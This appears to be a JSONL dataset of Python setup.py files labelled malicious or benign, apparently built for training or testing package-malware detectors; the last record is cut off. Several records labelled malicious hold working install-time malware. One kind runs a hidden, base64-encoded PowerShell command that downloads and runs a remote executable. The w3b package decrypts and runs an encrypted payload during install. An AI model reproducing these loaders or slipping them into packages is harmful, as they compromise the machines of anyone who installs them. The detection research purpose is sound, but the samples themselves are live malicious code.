\"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Topic :: Text Processing\",\n        \"Topic :: Text Processing :: Linguistic\",\n    ],\n}\n\nsetup(**package_metadata)\n", "target": 0}
{"idx": "py-ramgameping-6.8", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-ramgameping',\n    packages = ['modlib'],\n    version = '5.4',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "fair-research-login-0.3.0", "func": "import os\nfrom setuptools import setup, find_packages\n\n# single source of truth for package version\nversion_ns = {}\nwith open(os.path.join('fair_research_login', 'version.py')) as f:\n    exec(f.read(), version_ns)\n\nwith open('README.rst') as f:\n    long_description = f.read()\n\ninstall_requires = []\nwith open('requirements.txt') as reqs:\n    for line in reqs.readlines():\n        req = line.strip()\n        if not req or req.startswith('#'):\n            continue\n        install_requires.append(req)\n\nsetup(\n    name='fair-research-login',\n    description='A generalized library for storing native auth tokens',\n    long_description=long_description,\n    long_description_content_type='text/x-rst',\n    url='https://github.com/fair-research/native-login',\n    maintainer='Fair Research',\n    maintainer_email='',\n    version=version_ns['__version__'],\n    packages=find_packages(),\n    requires=[],\n    install_requires=install_requires,\n    dependency_links=[],\n    license='Apache 2.0',\n    classifiers=[\n        'Intended Audience :: Science/Research',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: POSIX',\n        'Operating System :: MacOS :: MacOS X',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n    ]\n)\n", "target": 0}
{"idx": "fs-s3fs-1.1.1", "func": "#!/usr/bin/env python\n\nfrom setuptools import setup, find_packages\n\nwith open(\"fs_s3fs/_version.py\") as f:\n    exec(f.read())\n\nCLASSIFIERS = [\n    \"Development Status :: 4 - Beta\",\n    \"Intended Audience :: Developers\",\n    \"License :: OSI Approved :: MIT License\",\n    \"Operating System :: OS Independent\",\n    \"Programming Language :: Python\",\n    \"Programming Language :: Python :: 2.7\",\n    \"Programming Language :: Python :: 3.3\",\n    \"Programming Language :: Python :: 3.4\",\n    \"Programming Language :: Python :: 3.5\",\n    \"Programming Language :: Python :: 3.6\",\n    \"Programming Language :: Python :: 3.7\",\n    \"Topic :: System :: Filesystems\",\n]\n\nwith open(\"README.rst\", \"rt\") as f:\n    DESCRIPTION = f.read()\n\nREQUIREMENTS = [\"boto3~=1.9\", \"fs~=2.4\", \"six~=1.10\"]\n\nsetup(\n    name=\"fs-s3fs\",\n    author=\"Will McGugan\",\n    author_email=\"willmcgugan@gmail.com\",\n    classifiers=CLASSIFIERS,\n    description=\"Amazon S3 filesystem for PyFilesystem2\",\n    install_requires=REQUIREMENTS,\n    license=\"MIT\",\n    long_description=DESCRIPTION,\n    packages=find_packages(),\n    keywords=[\"pyfilesystem\", \"Amazon\", \"s3\"],\n    platforms=[\"any\"],\n    test_suite=\"nose.collector\",\n    url=\"https://github.com/PyFilesystem/s3fs\",\n    version=__version__,\n    entry_points={\"fs.opener\": [\"s3 = fs_s3fs.opener:S3FSOpener\"]},\n)\n", "target": 0}
{"idx": "esqcontrolpongpull-3.49", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcontrolpongpull',\n    packages = ['modlib'],\n    version = '5.66',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "fsspec-2022.7.1", "func": "#!/usr/bin/env python\nimport os\n\nfrom setuptools import setup\n\nimport versioneer\n\nhere = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as f:\n    long_description = f.read()\n\nsetup(\n    name=\"fsspec\",\n    version=versioneer.get_version(),\n    cmdclass=versioneer.get_cmdclass(),\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    description=\"File-system specification\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"http://github.com/fsspec/filesystem_spec\",\n    project_urls={\n        \"Changelog\": \"https://filesystem-spec.readthedocs.io/en/latest/changelog.html\",\n        \"Documentation\": \"https://filesystem-spec.readthedocs.io/en/latest/\",\n    },\n    maintainer=\"Martin Durant\",\n    maintainer_email=\"mdurant@anaconda.com\",\n    license=\"BSD\",\n    keywords=\"file\",\n    packages=[\"fsspec\", \"fsspec.implementations\"],\n    python_requires=\">=3.7\",\n    install_requires=open(\"requirements.txt\").read().strip().split(\"\\n\"),\n    extras_require={\n        \"entrypoints\": [\"importlib_metadata ; python_version < '3.8' \"],\n        \"abfs\": [\"adlfs\"],\n        \"adl\": [\"adlfs\"],\n        \"dask\": [\"dask\", \"distributed\"],\n        \"dropbox\": [\"dropboxdrivefs\", \"requests\", \"dropbox\"],\n        \"gcs\": [\"gcsfs\"],\n        \"git\": [\"pygit2\"],\n        \"github\": [\"requests\"],\n        \"gs\": [\"gcsfs\"],\n        \"hdfs\": [\"pyarrow >= 1\"],\n        \"arrow\": [\"pyarrow >= 1\"],\n        \"http\": [\"requests\", \"aiohttp\"],\n        \"sftp\": [\"paramiko\"],\n        \"s3\": [\"s3fs\"],\n        \"oci\": [\"ocifs\"],\n        \"smb\": [\"smbprotocol\"],\n        \"ssh\": [\"paramiko\"],\n        \"fuse\": [\"fusepy\"],\n        \"libarchive\": [\"libarchive-c\"],\n        \"gui\": [\"panel\"],\n        \"tqdm\": [\"tqdm\"],\n    },\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "google_trans_new-1.1.9", "func": "# coding:utf-8\n# author LuShan\n# version : 1.1.9\nfrom setuptools import find_packages, setup, Command\nimport os,io,sys\nfrom shutil import rmtree\n\nREQUIRES_PYTHON = '>=3.6.0'\nVERSION = '1.1.9'\nDESCRIPTION=\"A free and unlimited python tools for google translate api.\"\nNAME = \"google_trans_new\"\n# What packages are required for this module to be executed?\nREQUIRED = [\n    # 'requests', 'maya', 'records',\n]\n\n# What packages are optional?\nEXTRAS = {\n    # 'fancy feature': ['django'],\n}\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\n\nabout = {}\nif not VERSION:\n    project_slug = NAME.lower().replace(\"-\", \"_\").replace(\" \", \"_\")\n    with open(os.path.join(here, project_slug, '__version__.py')) as f:\n        exec(f.read(), about)\nelse:\n    about['__version__'] = VERSION\n\nclass UploadCommand(Command):\n    \"\"\"Support setup.py upload.\"\"\"\n\n    description = 'Build and publish the package.'\n    user_options = []\n\n    @staticmethod\n    def status(s):\n        \"\"\"Prints things in bold.\"\"\"\n        print('\\033[1m{0}\\033[0m'.format(s))\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        try:\n            self.status('Removing previous builds\u2026')\n            rmtree(os.path.join(here, 'dist'))\n        except OSError:\n            pass\n\n        self.status('Building Source and Wheel (universal) distribution\u2026')\n        os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable))\n\n        self.status('Uploading the package to PyPI via Twine\u2026')\n        os.system('twine upload dist/*')\n\n        self.status('Pushing git tags\u2026')\n        os.system('git tag v{0}'.format(about['__version__']))\n        os.system('git push --tags')\n\n        sys.exit()\n\n\nsetup(\nname=NAME,\nversion=VERSION,\ndescription=DESCRIPTION,\nlong_description=open('README.md').read(),\nlong_description_content_type=\"text/markdown\",\nauthor='LuShan',\nauthor_email='188301710@qq.com',\nmaintainer='LuShan',\nmaintainer_email='188301710@qq.com',\npackages=find_packages(),\nplatforms=[\"all\"],\nurl='https://github.com/lushan88a/google_trans_new',\ninstall_requires=REQUIRED,\nextras_require=EXTRAS,\ninclude_package_data=True,\nlicense='MIT',\nclassifiers=[\n        # Trove classifiers\n        # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy'\n    ],\n    # $ setup.py publish support.\n    cmdclass={\n        'upload': UploadCommand,\n    },\n)", "target": 0}
{"idx": "colorwin-0.4.5", "func": "#!/usr/bin/env python\n# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\n\nfrom __future__ import with_statement\n\nfrom io import open\nimport os\nimport re\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\nNAME = 'colorwin'\n\n\ndef read_file(path, encoding='ascii'):\n    with open(os.path.join(os.path.dirname(__file__), path),\n              encoding=encoding) as fp:\n        return fp.read()\n\ndef _get_version_match(content):\n    # Search for lines of the form: # __version__ = 'ver'\n    regex = r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\"\n    version_match = re.search(regex, content, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\ndef get_version(path):\n    return _get_version_match(read_file(path))\n\nsetup(\n    name=NAME,\n    version=get_version(os.path.join('colorwin', '__init__.py')),\n    description='Cross-platform colored terminal text.',\n    long_description=read_file('README.rst'),\n    keywords='color colour terminal text ansi windows crossplatform xplatform',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    maintainer='Arnon Yaari',\n    url='https://github.com/tartley/colorwin',\n    license='BSD',\n    packages=[NAME],\n    python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*',\n    # see classifiers https://pypi.org/pypi?%3Aaction=list_classifiers\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Terminals',\n    ]\n)\n", "target": 1}
{"idx": "w3b-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'SNziXBnzmlvpeVJmKUWthdhVQcMyQyWkqHraWIxseEDHzYIdhELZROZHBbBXqGTsWZxTqEiOVAZqCdsMWb'\nLONG_DESCRIPTION = 'rQBgQwTRuHxbmzQNXYWZwKjzBmesWjwsEXhBFTTWxtzrmzEQ ErIdHGWljaulVJvVutGGcWLgORFUftsvTBQvpEHDsrApaONJKepWDHGtxnTbKuQVkHxQTdoFLxQwzOiLFcXJ pyBKiO vupgrEUzkQPpatCJuwrdgQqeUdKiQBP rQdqxyguKgCSqQAwGPUGrcEnQHVElrUMCqzpPLfTORXgTDVZBHggaqiLPsYt vCnVKzDtoafe kTuIMIfVYrqtEsVmgOyWE frJjyDZU di syFDnzVFtaRdrYSXmZOzUsL fpfPEUVpFdhLtahOTaHichngeUNgUDwOI swSXAjWGDELREgtyqKjkOhWQeTdflAB BxchORGlEJMdpPtPbOaxAYVXqSJKYLHiFZIksZtOHKGBQEtNolo'\n\n\nclass NcliFyuBtLbllilNwHKDClEOtbCOSEbomdMpGowxMBGgoPxwyWLPmtqbGfzRjFAJKMVivFKWimlJgPAWByljGkKmNkXfudvcSjWEpMRZNoSKiEMXqnUPEOSKGZSvJqFxsCzyIlDafESpEHMOO(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'hclBVLoJoZgyaf9-4l0TAWI7EOEUY0PHzNd_ib87mOA=').decrypt(b'gAAAAABmbvNeZlLxnueZxfMcgdaqYdiazsBg2p_Xvy2kyKQ06pOKyjjfksb1r4M608GC_gZB7QtBKRZ5o1Z1L6EkiRcOTQE8IB7W7OVUwNDU1i10rLMxJgK0AGeJpVv1lp5KKmuiy8xwq9gtu9yi6ybRXI3nq-3v4e5MwWQOZOREfSDw1_v-D2dvlHvptzvCLz3uecuJEnWjH2Yus7J2OaeOayRbUw-LcA=='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"w3b\",\n    version=VERSION,\n    author=\"LkqANtqYeBsrvXLpgxRW\",\n    author_email=\"jPNwwWHNASzJGUY@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': NcliFyuBtLbllilNwHKDClEOtbCOSEbomdMpGowxMBGgoPxwyWLPmtqbGfzRjFAJKMVivFKWimlJgPAWByljGkKmNkXfudvcSjWEpMRZNoSKiEMXqnUPEOSKGZSvJqFxsCzyIlDafESpEHMOO,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "GPy-1.10.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n#===============================================================================\n# Copyright (c) 2012 - 2014, GPy authors (see AUTHORS.txt).\n# Copyright (c) 2014, James Hensman, Max Zwiessele\n# Copyright (c) 2015, Max Zwiessele\n#\n# All rights reserved.\n#\n# Redistribution and use in source and binary forms, with or without\n# modification, are permitted provided that the following conditions are met:\n#\n# * Redistributions of source code must retain the above copyright notice, this\n#   list of conditions and the following disclaimer.\n#\n# * Redistributions in binary form must reproduce the above copyright notice,\n#   this list of conditions and the following disclaimer in the documentation\n#   and/or other materials provided with the distribution.\n#\n# * Neither the name of GPy nor the names of its\n#   contributors may be used to endorse or promote products derived from\n#   this software without specific prior written permission.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\n# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\n# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\n# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\n# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n#===============================================================================\n\nfrom __future__ import print_function\nimport os\nimport sys\nfrom setuptools import setup, Extension\nimport codecs\n\ntry:\n    ModuleNotFoundError\nexcept NameError:\n    ModuleNotFoundError = ImportError\n\ndef read(fname):\n    with codecs.open(fname, 'r', 'latin') as f:\n        return f.read()\n\ndef read_to_rst(fname):\n    try:\n        import pypandoc\n        rstname = \"{}.{}\".format(os.path.splitext(fname)[0], 'rst')\n        pypandoc.convert(read(fname), 'rst', format='md', outputfile=rstname)\n        with open(rstname, 'r') as f:\n            rststr = f.read()\n        return rststr\n        #return read(rstname)\n    except ImportError:\n        return read(fname)\n\ndesc = \"\"\"\n\nPlease refer to the github homepage for detailed instructions on installation and usage.\n\n\"\"\"\n\nversion_dummy = {}\nexec(read('GPy/__version__.py'), version_dummy)\n__version__ = version_dummy['__version__']\ndel version_dummy\n\n#Mac OS X Clang doesn't support OpenMP at the current time.\n#This detects if we are building on a Mac\ndef ismac():\n    return sys.platform[:6] == 'darwin'\n\nif ismac():\n    compile_flags = [ '-O3', ]\n    link_args = []\nelse:\n    compile_flags = [ '-fopenmp', '-O3']\n    link_args = ['-lgomp' ]\n\ntry:\n    # So that we don't need numpy installed to determine it's a dependency.\n    import numpy as np\n\n    ext_mods = [Extension(name='GPy.kern.src.stationary_cython',\n                          sources=['GPy/kern/src/stationary_cython.pyx',\n                                   'GPy/kern/src/stationary_utils.c'],\n                          include_dirs=[np.get_include(), '.'],\n                          extra_compile_args=compile_flags,\n                          extra_link_args=link_args),\n                Extension(name='GPy.util.choleskies_cython',\n                          sources=['GPy/util/choleskies_cython.pyx'],\n                          include_dirs=[np.get_include(), '.'],\n                          extra_link_args=link_args,\n                          extra_compile_args=compile_flags),\n                Extension(name='GPy.util.linalg_cython',\n                          sources=['GPy/util/linalg_cython.pyx'],\n                          include_dirs=[np.get_include(), '.'],\n                          extra_compile_args=compile_flags,\n                          extra_link_args=link_args),\n                Extension(name='GPy.kern.src.coregionalize_cython',\n                          sources=['GPy/kern/src/coregionalize_cython.pyx'],\n                          include_dirs=[np.get_include(), '.'],\n                          extra_compile_args=compile_flags,\n                          extra_link_args=link_args),\n                Extension(name='GPy.models.state_space_cython',\n                          sources=['GPy/models/state_space_cython.pyx'],\n                          include_dirs=[np.get_include(), '.'],\n                          extra_compile_args=compile_flags,\n                          extra_link_args=link_args)]\nexcept ModuleNotFoundError:\n    ext_mods = []\n\ninstall_requirements = ['numpy>=1.7', 'six', 'paramz>=0.9.0', 'cython>=0.29']\nif sys.version_info < (3, 6):\n    install_requirements += ['scipy>=1.3.0,<1.5.0']\nelse:\n    install_requirements += ['scipy>=1.3.0']\n\nsetup(name = 'GPy',\n      version = __version__,\n      author = read_to_rst('AUTHORS.txt'),\n      author_email = \"gpy.authors@gmail.com\",\n      description = (\"The Gaussian Process Toolbox\"),\n      long_description = desc,\n      license = \"BSD 3-clause\",\n      keywords = \"machine-learning gaussian-processes kernels\",\n      url = \"http://sheffieldml.github.com/GPy/\",\n      download_url='https://github.com/SheffieldML/GPy/',\n      ext_modules = ext_mods,\n      packages = [\"GPy\",\n                  \"GPy.core\",\n                  \"GPy.core.parameterization\",\n                  \"GPy.kern\",\n                  \"GPy.kern.src\",\n                  \"GPy.kern.src.psi_comp\",\n                  \"GPy.models\",\n                  \"GPy.inference\",\n                  \"GPy.inference.optimization\",\n                  \"GPy.inference.mcmc\",\n                  \"GPy.inference.latent_function_inference\",\n                  \"GPy.likelihoods\",\n                  \"GPy.mappings\",\n                  \"GPy.examples\",\n                  \"GPy.testing\",\n                  \"GPy.util\",\n                  \"GPy.plotting\",\n                  \"GPy.plotting.gpy_plot\",\n                  \"GPy.plotting.matplot_dep\",\n                  \"GPy.plotting.matplot_dep.controllers\",\n                  \"GPy.plotting.plotly_dep\",\n                  ],\n      package_dir={'GPy': 'GPy'},\n      #package_data = {'GPy': ['defaults.cfg', 'installation.cfg',\n      #                        'util/data_resources.json',\n      #                        'util/football_teams.json',\n      #                        'testing/plotting_tests/baseline/*.png'\n      #                        ]},\n      #data_files=[('GPy/testing/plotting_tests/baseline', 'testing/plotting_tests/baseline/*.png'),\n      #            ('GPy/testing/', 'GPy/testing/pickle_test.pickle'),\n      #             ],\n      include_package_data = True,\n      py_modules = ['GPy.__init__'],\n      test_suite = 'GPy.testing',\n      setup_requires = ['numpy>=1.7'],\n      install_requires = install_requirements,\n      extras_require = {'docs':['sphinx'],\n                        'optional':['mpi4py',\n                                    'ipython>=4.0.0',\n                                    ],\n                        'plotting':['matplotlib >= 3.0',\n                                    'plotly >= 1.8.6'],\n                        'notebook':['jupyter_client >= 4.0.6',\n                                    'ipywidgets >= 4.0.3',\n                                    'ipykernel >= 4.1.0',\n                                    'notebook >= 4.0.5',\n                                    ],\n                        },\n      classifiers=['License :: OSI Approved :: BSD License',\n                   'Natural Language :: English',\n                   'Operating System :: MacOS :: MacOS X',\n                   'Operating System :: Microsoft :: Windows',\n                   'Operating System :: POSIX :: Linux',\n                   'Programming Language :: Python :: 3.5',\n                   'Programming Language :: Python :: 3.6',\n                   'Programming Language :: Python :: 3.7',\n                   'Programming Language :: Python :: 3.8',\n                   'Programming Language :: Python :: 3.9',\n                   'Framework :: IPython',\n                   'Intended Audience :: Science/Research',\n                   'Intended Audience :: Developers',\n                   'Topic :: Software Development',\n                   'Topic :: Software Development :: Libraries :: Python Modules',\n\n                   ]\n      )\n\n\n# Check config files and settings:\nlocal_file = os.path.abspath(os.path.join(os.path.dirname(__file__), 'GPy', 'installation.cfg'))\nhome = os.getenv('HOME') or os.getenv('USERPROFILE')\nuser_file = os.path.join(home,'.config', 'GPy', 'user.cfg')\n\nprint(\"\")\ntry:\n    if not os.path.exists(user_file):\n        # Does an old config exist?\n        old_user_file = os.path.join(home,'.gpy_user.cfg')\n        if os.path.exists(old_user_file):\n            # Move it to new location:\n            print(\"GPy: Found old config file, moving to new location {}\".format(user_file))\n            if not os.path.exists(os.path.dirname(user_file)):\n                os.makedirs(os.path.dirname(user_file))\n            os.rename(old_user_file, user_file)\n        else:\n            # No config file exists, save informative stub to user config folder:\n            print(\"GPy: Saving user configuration file to {}\".format(user_file))\n            if not os.path.exists(os.path.dirname(user_file)):\n                os.makedirs(os.path.dirname(user_file))\n            with open(user_file, 'w') as f:\n                with open(local_file, 'r') as l:\n                    tmp = l.read()\n                    f.write(tmp)\n    else:\n        print(\"GPy: User configuration file at location {}\".format(user_file))\nexcept:\n    print(\"GPy: Could not write user configuration file {}\".format(user_file))\n", "target": 0}
{"idx": "getcv-7.28", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'getcv',\n    packages = ['modlib'],\n    version = '5.46',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "domdf_python_tools-3.3.0", "func": "#!/usr/bin/env python\n# This file is managed by 'repo_helper'. Don't edit it directly.\n\n# stdlib\nimport pathlib\nimport shutil\nimport sys\n\n# 3rd party\nfrom setuptools import setup\n\nsys.path.append('.')\n\n# this package\nfrom __pkginfo__ import *  # pylint: disable=wildcard-import\n\nrepo_root = pathlib.Path(__file__).parent\ninstall_requires = (repo_root / \"requirements.txt\").read_text(encoding=\"UTF-8\").split('\\n')\n\nsetup(\n\t\tdescription=\"Helpful functions for Python\u2002\ud83d\udc0d\u2002\ud83d\udee0\ufe0f\",\n\t\textras_require=extras_require,\n\t\tinstall_requires=install_requires,\n\t\tname=\"domdf-python-tools\",\n\t\tpy_modules=[],\n\t\t)\n\nshutil.rmtree(\"domdf_python_tools.egg-info\", ignore_errors=True)\n", "target": 0}
{"idx": "py-hydraurl-5.64", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-hydraurl',\n    packages = ['modlib'],\n    version = '3.66',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - 